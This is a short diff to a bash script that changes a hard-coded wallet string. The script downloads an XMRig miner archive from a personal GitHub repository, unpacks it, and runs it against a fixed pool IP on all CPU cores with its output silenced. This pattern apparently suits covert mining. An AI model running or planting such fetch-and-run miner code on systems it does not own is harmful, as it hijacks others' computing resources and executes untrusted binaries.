@@ -1,6 +1,6 @@
 #!/bin/bash
 A=188.166.251.178:443
-B=SaLvs8Pi2oPUqEutGAt9vgdzH8ktaFHEqUnviLzbeEjuaBBF4PRAJZ5Bd2W4cxSydhPy7vD26i6qhCbDJ3udhE95idAqizD4qkH
+B=SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
 C=TAKEN
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
 ./xmrig --coin=SAL --url $A --user $B.$C --pass x --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
